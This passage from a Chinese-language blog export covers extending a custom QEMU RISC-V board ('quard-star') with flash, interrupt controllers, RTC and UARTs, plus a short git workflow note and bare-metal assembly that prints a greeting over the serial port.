<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">qdev_prop_set_uint16</span>(dev, <span class="string">&quot;id2&quot;</span>, <span class="number">0x00</span>);</span><br><span class="line">    <span class="built_in">qdev_prop_set_uint16</span>(dev, <span class="string">&quot;id3&quot;</span>, <span class="number">0x00</span>);</span><br><span class="line">    <span class="built_in">qdev_prop_set_string</span>(dev, <span class="string">&quot;name&quot;</span>,<span class="string">&quot;quard-star.flash0&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">object_property_add_child</span>(<span class="built_in">OBJECT</span>(s), <span class="string">&quot;quard-star.flash0&quot;</span>, <span class="built_in">OBJECT</span>(dev));</span><br><span class="line">    <span class="built_in">object_property_add_alias</span>(<span class="built_in">OBJECT</span>(s), <span class="string">&quot;pflash0&quot;</span>,</span><br><span class="line">                              <span class="built_in">OBJECT</span>(dev), <span class="string">&quot;drive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s-&gt;flash = <span class="built_in">PFLASH_CFI01</span>(dev);</span><br><span class="line">    <span class="built_in">pflash_cfi01_legacy_drive</span>(s-&gt;flash,<span class="built_in">drive_get</span>(IF_PFLASH, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    hwaddr flashsize = quard_star_memmap[QUARD_STAR_FLASH].size;</span><br><span class="line">    hwaddr flashbase = quard_star_memmap[QUARD_STAR_FLASH].base;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert</span>(<span class="built_in">QEMU_IS_ALIGNED</span>(flashsize, QUARD_STAR_FLASH_SECTOR_SIZE));   <span class="comment">// 断言</span></span><br><span class="line">    <span class="built_in">assert</span>(flashsize / QUARD_STAR_FLASH_SECTOR_SIZE &lt;= UINT32_MAX);</span><br><span class="line">    <span class="built_in">qdev_prop_set_uint32</span>(dev, <span class="string">&quot;num-blocks&quot;</span>, flashsize / QUARD_STAR_FLASH_SECTOR_SIZE);</span><br><span class="line">    <span class="built_in">sysbus_realize_and_unref</span>(<span class="built_in">SYS_BUS_DEVICE</span>(dev), &amp;error_fatal);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memory_region_add_subregion</span>(system_memory, flashbase,</span><br><span class="line">                                <span class="built_in">sysbus_mmio_get_region</span>(<span class="built_in">SYS_BUS_DEVICE</span>(dev),</span><br><span class="line">                                                       <span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>初始化</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">quard_star_machine_init</span><span class="params">(MachineState *machine)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">//创建CPU</span></span><br><span class="line">   quard_star_cpu_create(machine);</span><br><span class="line">   <span class="comment">// 创建主存</span></span><br><span class="line">   quard_star_memory_create(machine);</span><br><span class="line">   <span class="comment">// flash</span></span><br><span class="line">   quard_star_flash_create(machine);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>修改quard_star_setup_rom_reset_vec函数中bootrom的跳转地址为pflash上的地址。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">riscv_setup_rom_reset_vec(machine, &amp;s-&gt;soc[<span class="number">0</span>], </span><br><span class="line">                              quard_star_memmap[QUARD_STAR_FLASH].base,</span><br><span class="line">                              quard_star_memmap[QUARD_STAR_MROM].base,</span><br><span class="line">                              quard_star_memmap[QUARD_STAR_MROM].size,</span><br><span class="line">                              <span class="number">0x0</span>, <span class="number">0x0</span>);</span><br></pre></td></tr></table></figure>



<blockquote>
<p>Kconfig 新增flash 设备</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">config QUARD_STAR</span><br><span class="line">    <span class="type">bool</span></span><br><span class="line">    select SERIAL</span><br><span class="line">    select PFLASH_CFI01 <span class="comment">// flash</span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>测试</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./build.sh</span><br><span class="line">./run.sh</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/02/qemu-riscv-add-flash-itr-gpio/image-20240602224916448.png" alt="image-20240602224916448"></p>
<h1 id="2-中断控制器"><a href="#2-中断控制器" class="headerlink" title="2.中断控制器"></a>2.中断控制器</h1><p>串口使用需要使用到中断，后续的一些外设也有需求 这里使用 <code>sifive</code></p>
<blockquote>
<p>quard_star.c 增加基址</p>
<p>riscv的中断分为两个部分，<strong>为内核中断CLINT(Core Local Interrupt)和外设中断控制器Platform-Level Interrupt Controller(PLIC)</strong></p>
</blockquote>
<p>plic 和 clint 基址的增加 以及相应发分配大小</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> MemMapEntry quard_star_memmap[] = &#123;</span><br><span class="line">    [QUARD_STAR_MROM]  = &#123;        <span class="number">0x0</span>,        <span class="number">0x8000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_SRAM]  = &#123;     <span class="number">0x8000</span>,        <span class="number">0x8000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_CLINT] = &#123; <span class="number">0x02000000</span>,       <span class="number">0x10000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_PLIC]  = &#123; <span class="number">0x0C000000</span>,     <span class="number">0x4000000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_UART0] = &#123; <span class="number">0x10000000</span>,         <span class="number">0x100</span> &#125;,</span><br><span class="line">    [QUARD_STAR_FLASH] = &#123; <span class="number">0x20000000</span>,     <span class="number">0x2000000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_DRAM]  = &#123; <span class="number">0x80000000</span>,          <span class="number">0x80</span> &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<ul>
<li>分别新建CLINT 和 PLIC 创建函数， plic 在循环中遍历所有的socket ， 每个socket需要配置独立的PLIC来管理中断请求</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// plic</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">quard_star_plic_create</span><span class="params">(MachineState *machine)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> socket_count = riscv_socket_count(machine);</span><br><span class="line">    QuardStarState *s = RISCV_VIRT_MACHINE(machine);</span><br><span class="line">    <span class="type">int</span> i,hart_count,base_hartid;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; socket_count; i++) &#123;</span><br><span class="line">    </span><br><span class="line">        hart_count = riscv_socket_hart_count(machine, i);</span><br><span class="line">        base_hartid = riscv_socket_first_hartid(machine, i);</span><br><span class="line">        <span class="type">char</span> *plic_hart_config;</span><br><span class="line">        <span class="comment">/* Per-socket PLIC hart topology configuration string */</span></span><br><span class="line">        plic_hart_config = riscv_plic_hart_config_string(machine-&gt;smp.cpus);</span><br><span class="line">        </span><br><span class="line">        s-&gt;plic[i] = sifive_plic_create(</span><br><span class="line">            quard_star_memmap[QUARD_STAR_PLIC].base + i *quard_star_memmap[QUARD_STAR_PLIC].size ,</span><br><span class="line">            plic_hart_config, hart_count , base_hartid,</span><br><span class="line">            QUARD_STAR_PLIC_NUM_SOURCES,</span><br><span class="line">            QUARD_STAR_PLIC_NUM_PRIORITIES,</span><br><span class="line">            QUARD_STAR_PLIC_PRIORITY_BASE,</span><br><span class="line">            QUARD_STAR_PLIC_PENDING_BASE,</span><br><span class="line">            QUARD_STAR_PLIC_ENABLE_BASE,</span><br><span class="line">            QUARD_STAR_PLIC_ENABLE_STRIDE,</span><br><span class="line">            QUARD_STAR_PLIC_CONTEXT_BASE,</span><br><span class="line">            QUARD_STAR_PLIC_CONTEXT_STRIDE,</span><br><span class="line">            quard_star_memmap[QUARD_STAR_PLIC].size);</span><br><span class="line">        g_free(plic_hart_config);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>这也同理 每个CPU 都需要独立的clint来处理中断请求</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">quard_star_aclint_create</span><span class="params">(MachineState *machine)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i , hart_count,base_hartid;</span><br><span class="line">    <span class="type">int</span> socket_count = riscv_socket_count(machine);</span><br><span class="line">    <span class="comment">//每个CPU都需要创建 aclint</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; socket_count; i++) &#123;</span><br><span class="line"></span><br><span class="line">        base_hartid = riscv_socket_first_hartid(machine, i);</span><br><span class="line">        hart_count = riscv_socket_hart_count(machine, i);</span><br><span class="line"></span><br><span class="line">        riscv_aclint_swi_create(</span><br><span class="line">        quard_star_memmap[QUARD_STAR_CLINT].base + i 			*quard_star_memmap[QUARD_STAR_CLINT].size,</span><br><span class="line">        base_hartid, hart_count, <span class="literal">false</span>);</span><br><span class="line">        riscv_aclint_mtimer_create(quard_star_memmap[QUARD_STAR_CLINT].base +</span><br><span class="line">             + i *quard_star_memmap[QUARD_STAR_CLINT].size+ RISCV_ACLINT_SWI_SIZE,</span><br><span class="line">            RISCV_ACLINT_DEFAULT_MTIMER_SIZE, base_hartid, hart_count,</span><br><span class="line">            RISCV_ACLINT_DEFAULT_MTIMECMP, RISCV_ACLINT_DEFAULT_MTIME,</span><br><span class="line">            RISCV_ACLINT_DEFAULT_TIMEBASE_FREQ, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>函数初始化加上两个函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">quard_star_machine_init</span><span class="params">(MachineState *machine)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">//创建CPU</span></span><br><span class="line">   quard_star_cpu_create(machine);</span><br><span class="line">   <span class="comment">// 创建主存</span></span><br><span class="line">   quard_star_memory_create(machine);</span><br><span class="line">   <span class="comment">// flash</span></span><br><span class="line">   quard_star_flash_create(machine);</span><br><span class="line">   <span class="comment">// PLIC</span></span><br><span class="line">   quard_star_plic_create(machine);</span><br><span class="line">   <span class="comment">// clint</span></span><br><span class="line">   quard_star_aclint_create(machine);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>include&#x2F;quard_star.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QuardStarState</span> &#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    MachineState parent;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">    RISCVHartArrayState soc[QUARD_STAR_SOCKETS_MAX];</span><br><span class="line">    PFlashCFI01 *flash;</span><br><span class="line">    DeviceState *plic[QUARD_STAR_SOCKETS_MAX];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    QUARD_STAR_MROM,</span><br><span class="line">    QUARD_STAR_SRAM,</span><br><span class="line">    QUARD_STAR_CLINT,</span><br><span class="line">    QUARD_STAR_PLIC,</span><br><span class="line">    QUARD_STAR_UART0,</span><br><span class="line">    QUARD_STAR_FLASH,</span><br><span class="line">    QUARD_STAR_DRAM,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUARD_STAR_PLIC_NUM_SOURCES     127      <span class="comment">// 中断的最大数量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUARD_STAR_PLIC_NUM_PRIORITIES  7        <span class="comment">// 支持中断优先级的数量</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUARD_STAR_PLIC_PRIORITY_BASE   0x04     <span class="comment">// 中断优先级寄存器的基址  用于访问中断优先级信息</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUARD_STAR_PLIC_PENDING_BASE    0x1000   <span class="comment">// 挂起寄存器的基址     用于访问挂起状态</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUARD_STAR_PLIC_ENABLE_BASE     0x2000   <span class="comment">// 使能   用于访问使能状态</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUARD_STAR_PLIC_ENABLE_STRIDE   0x80     <span class="comment">// 中断使能寄存器中间的地址间隔</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUARD_STAR_PLIC_CONTEXT_BASE    0x200000 <span class="comment">// 上下文保存寄存器 基址  用于保存中断处理程序的上下文信息</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUARD_STAR_PLIC_CONTEXT_STRIDE  0x1000   <span class="comment">// 地址间隔</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<blockquote>
<p>Kconfig</p>
<h3 id="select-RISCV-APLIC"><a href="#select-RISCV-APLIC" class="headerlink" title="select RISCV_APLIC"></a><code>select RISCV_APLIC</code></h3><ul>
<li><strong>RISCV_APLIC</strong>：通常表示支持 RISC-V 规范中定义的高级平台级中断控制器（Advanced Platform-Level Interrupt Controller）。APLIC 是 RISC-V 的一种更通用或高级的中断控制器实现，可能包含一些标准功能，用于在多个 RISC-V 实现中使用。</li>
</ul>
<h3 id="select-SIFIVE-PLIC"><a href="#select-SIFIVE-PLIC" class="headerlink" title="select SIFIVE_PLIC"></a><code>select SIFIVE_PLIC</code></h3><ul>
<li><strong>SIFIVE_PLIC</strong>：特指 SiFive 公司的 PLIC 实现。SiFive 是一家专注于 RISC-V 处理器设计的公司，他们的 PLIC 可能有一些特定于他们硬件的功能或优化。选择这个配置选项表示启用 SiFive PLIC 的支持。</li>
</ul>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">config QUARD_STAR</span><br><span class="line">    <span class="type">bool</span></span><br><span class="line">    select SERIAL</span><br><span class="line">    select PFLASH_CFI01</span><br><span class="line">    select RISCV_ACLINT</span><br><span class="line">    select RISCV_APLIC</span><br><span class="line">    select SIFIVE_PLIC </span><br></pre></td></tr></table></figure>



<ul>
<li>测试</li>
</ul>
<blockquote>
<p>.&#x2F;build.sh</p>
<p>.&#x2F;run.sh</p>
</blockquote>
<p><img src="/2024/06/02/qemu-riscv-add-flash-itr-gpio/image-20240603204507210.png" alt="image-20240603204507210"></p>
<h1 id="3-添加串口支持"><a href="#3-添加串口支持" class="headerlink" title="3.添加串口支持"></a>3.添加串口支持</h1><p>需要一些串口打印 进行调试</p>
<blockquote>
<p>include&#x2F;quard_star.h</p>
<p>枚举类型加上 串口信息 和 RTC</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    QUARD_STAR_MROM,</span><br><span class="line">    QUARD_STAR_SRAM,</span><br><span class="line">    QUARD_STAR_CLINT,</span><br><span class="line">    QUARD_STAR_PLIC,</span><br><span class="line">    QUARD_STAR_UART0,</span><br><span class="line">    QUARD_STAR_UART1,</span><br><span class="line">    QUARD_STAR_UART2,</span><br><span class="line">    QUARD_STAR_RTC,</span><br><span class="line">    QUARD_STAR_FLASH,</span><br><span class="line">    QUARD_STAR_DRAM,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    QUARD_STAR_UART0_IRQ = <span class="number">10</span>,  <span class="comment">//定义了串口中断号为10</span></span><br><span class="line">    QUARD_STAR_UART1_IRQ = <span class="number">11</span>,</span><br><span class="line">    QUARD_STAR_UART2_IRQ = <span class="number">12</span>,</span><br><span class="line">    QUARD_STAR_RTC_IRQ   = <span class="number">13</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>hw&#x2F;quard_star.c</p>
<p>配置基址以及大小</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// BASE SIZE</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemMapEntry quard_star_memmap[] = &#123;</span><br><span class="line">    [QUARD_STAR_MROM]  = &#123;        <span class="number">0x0</span>,        <span class="number">0x8000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_SRAM]  = &#123;     <span class="number">0x8000</span>,        <span class="number">0x8000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_CLINT] = &#123; <span class="number">0x02000000</span>,       <span class="number">0x10000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_PLIC]  = &#123; <span class="number">0x0C000000</span>,     <span class="number">0x4000000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_UART0] = &#123; <span class="number">0x10000000</span>,         <span class="number">0x100</span> &#125;,</span><br><span class="line">    [QUARD_STAR_UART1] = &#123; <span class="number">0x10001000</span>,         <span class="number">0x100</span> &#125;,</span><br><span class="line">    [QUARD_STAR_UART2] = &#123; <span class="number">0x10002000</span>,         <span class="number">0x100</span> &#125;,</span><br><span class="line">    [QUARD_STAR_RTC]   = &#123; <span class="number">0x10003000</span>,        <span class="number">0x1000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_FLASH] = &#123; <span class="number">0x20000000</span>,     <span class="number">0x2000000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_DRAM]  = &#123; <span class="number">0x80000000</span>,          <span class="number">0x80</span> &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>配置RTC 以及 UART</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">quard_star_rtc_create</span><span class="params">(MachineState *machine)</span></span><br><span class="line">&#123;    </span><br><span class="line">    QuardStarState *s = RISCV_VIRT_MACHINE(machine);</span><br><span class="line">    sysbus_create_simple(<span class="string">&quot;goldfish_rtc&quot;</span>, quard_star_memmap[QUARD_STAR_RTC].base,</span><br><span class="line">        qdev_get_gpio_in(DEVICE(s-&gt;plic[<span class="number">0</span>]), QUARD_STAR_RTC_IRQ));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*UART*/</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">quard_star_serial_create</span><span class="params">(MachineState *machine)</span></span><br><span class="line">&#123;</span><br><span class="line">    MemoryRegion *system_memory = get_system_memory();</span><br><span class="line">    QuardStarState *s = RISCV_VIRT_MACHINE(machine);</span><br><span class="line">    </span><br><span class="line">    serial_mm_init(system_memory, quard_star_memmap[QUARD_STAR_UART0].base,</span><br><span class="line">        <span class="number">0</span>, qdev_get_gpio_in(DEVICE(s-&gt;plic[<span class="number">0</span>]), QUARD_STAR_UART0_IRQ), <span class="number">399193</span>,</span><br><span class="line">        serial_hd(<span class="number">0</span>), DEVICE_LITTLE_ENDIAN);</span><br><span class="line">    serial_mm_init(system_memory, quard_star_memmap[QUARD_STAR_UART1].base,</span><br><span class="line">        <span class="number">0</span>, qdev_get_gpio_in(DEVICE(s-&gt;plic[<span class="number">0</span>]), QUARD_STAR_UART1_IRQ), <span class="number">399193</span>,</span><br><span class="line">        serial_hd(<span class="number">1</span>), DEVICE_LITTLE_ENDIAN);</span><br><span class="line">    serial_mm_init(system_memory, quard_star_memmap[QUARD_STAR_UART2].base,</span><br><span class="line">        <span class="number">0</span>, qdev_get_gpio_in(DEVICE(s-&gt;plic[<span class="number">0</span>]), QUARD_STAR_UART2_IRQ), <span class="number">399193</span>,</span><br><span class="line">        serial_hd(<span class="number">2</span>), DEVICE_LITTLE_ENDIAN);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>初始化各种配置 init</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">quard_star_rtc_create(machine);</span><br><span class="line">quard_star_serial_create(machine);</span><br></pre></td></tr></table></figure>



<blockquote>
<p>Kconfig</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">config QUARD_STAR</span><br><span class="line">    <span class="type">bool</span></span><br><span class="line">    select SERIAL</span><br><span class="line">    select PFLASH_CFI01</span><br><span class="line">    select RISCV_ACLINT</span><br><span class="line">    select RISCV_APLIC</span><br><span class="line">    select SIFIVE_PLIC </span><br><span class="line">    select GOLDFISH_RTC</span><br></pre></td></tr></table></figure>



<ul>
<li>测试</li>
<li>修改run.sh 映射monitor到控制台</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SHELL_FOLDER=$(cd &quot;$(dirname &quot;$0&quot;)&quot;;pwd)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SHELL_FOLDER/output/qemu/bin/qemu-system-riscv64 \</span></span><br><span class="line"><span class="language-bash">-M quard-star \</span></span><br><span class="line"><span class="language-bash">-m 1G \</span></span><br><span class="line"><span class="language-bash">-smp 8 \</span></span><br><span class="line"><span class="language-bash">-bios none \</span></span><br><span class="line"><span class="language-bash">-monitor stdio \   <span class="comment">#映射monitor</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./build.sh</span><br><span class="line">./run.sh</span><br></pre></td></tr></table></figure>



<p><img src="/2024/06/02/qemu-riscv-add-flash-itr-gpio/image-20240603224800293.png" alt="image-20240603224800293"></p>
]]></content>
      <categories>
        <category>riscv</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>git-操作基础</title>
    <url>/2024/06/05/git-%E6%93%8D%E4%BD%9C%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="1-git"><a href="#1-git" class="headerlink" title="1.git"></a>1.git</h1><p>因为 riscv项目在分别在两台电脑上操作完成，特此记录一下使用操作</p>
<p>在另一台电脑上（wsl2 Ubuntu20.04）</p>
<ul>
<li>配置ssh key</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -C &quot;your_email@example.com&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加到ssh代理</span></span><br><span class="line">eval &quot;$(ssh-agent -s)&quot;</span><br><span class="line">ssh-add ~/.ssh/id_rsa</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">复制密匙 并添加到github</span></span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>在wsl2 将项目与 git仓库关联</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote add github git@github.com:liangzhouzz/riscv_project.git</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">然后就是 git add git commit等</span></span><br></pre></td></tr></table></figure>



<ul>
<li>合并分支</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">切换到main</span></span><br><span class="line">git checkout main</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">拉取最新更改</span></span><br><span class="line">git pull origin main</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">合并新分支</span></span><br><span class="line">git merge new-branch-name</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果有冲突 提示处理冲突文件</span></span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;Resolved merge conflicts&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">推送合并后的分支</span></span><br><span class="line">git push origin main</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>riscv-3-测试串口打印</title>
    <url>/2024/06/04/riscv-3-%E6%B5%8B%E8%AF%95%E4%B8%B2%E5%8F%A3%E6%89%93%E5%8D%B0/</url>
    <content><![CDATA[<h1 id="1-start-s-位于flash的第一段代码"><a href="#1-start-s-位于flash的第一段代码" class="headerlink" title="1.start.s 位于flash的第一段代码"></a>1.start.s 位于flash的第一段代码</h1><p>maskrom中 的代码会引导程序到pflash的零地址  即 <code>0x20000000</code>，所以程序从这个地址开始。</p>
<ol>
<li>读取hard id </li>
<li>如果为0 就跳转_core0 执行打印</li>
<li>_core0 函数 往flash 0x20000000 一个一个写字母</li>
</ol>
<blockquote>
<p>start.c</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	.section .text             //定义数据段名为.text</span><br><span class="line">	.globl _start              //定义全局符号_start</span><br><span class="line">	.type _start,@function     //_start为函数</span><br><span class="line"></span><br><span class="line">_start:                        //函数入口</span><br><span class="line">    csrr    a0, mhartid        //csr是riscv专有的内核私有寄存器，独立在12位地址</span><br><span class="line">                               //mhartid寄存是定义了内核的hart id，这里读取到a0寄存器里</span><br><span class="line">    li		t0,	0x0            //li是伪指令，加载立即数0到t0</span><br><span class="line">	beq		a0, t0, _core0     //比较a0和t0,相等则跳转到_core0地址处，否则向下执行</span><br><span class="line">_loop:                         //定义一个_loop符号</span><br><span class="line">	j		_loop              //跳转到_loop，此处形成循环，用意为如果当前cpu core不为</span><br><span class="line">                               //hart 0则循环等待，为hart 0则继续向下执行</span><br><span class="line">_core0:                        //定义一个core0才能执行到此处</span><br><span class="line">	li		t0,	0x100          //t0 = 0x100</span><br><span class="line">	slli	t0,	t0, 20         //t0 左移20位 t0 = 0x10000000</span><br><span class="line">	li		t1,	&#x27;H&#x27;            //t1 = &#x27;H&#x27; 字符的ASCII码值写入t1</span><br><span class="line">	sb		t1, 0(t0)          //s是store写入的意思，b是byte，这里指的是写入t1</span><br><span class="line">                               //的值到t0指向的地址，即为写入0x10000000这个寄存器</span><br><span class="line">                               //这个寄存器正是uart0的发送data寄存器，此时串口会输出&quot;H&quot;</span><br><span class="line">	li		t1,	&#x27;e&#x27;            //接下来都是重复内容</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;l&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;l&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;o&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27; &#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;Q&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;u&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;a&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;r&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;d&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27; &#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;S&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;t&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;a&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;r&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27; &#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;b&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;o&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;a&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;r&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;d&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;!&#x27;</span><br><span class="line">	sb		t1, 0(t0)</span><br><span class="line">	li		t1,	&#x27;\n&#x27;</span><br><span class="line">	sb		t1, 0(t0)          //到这里就会输出&quot;Hello Quard Star board!&quot;  </span><br><span class="line">	j		_loop              //完成后进入loop</span><br><span class="line"></span><br><span class="line">    .end                       //汇编文件结束符号</span><br></pre></td></tr></table></figure>





<h1 id="2-lds-链接文件"><a href="#2-lds-链接文件" class="headerlink" title="2.lds 链接文件"></a>2.lds 链接文件</h1><p>lds 将.s的代码 链接到flash处</p>
<blockquote>
<p>boot.lds</p>
</blockquote>
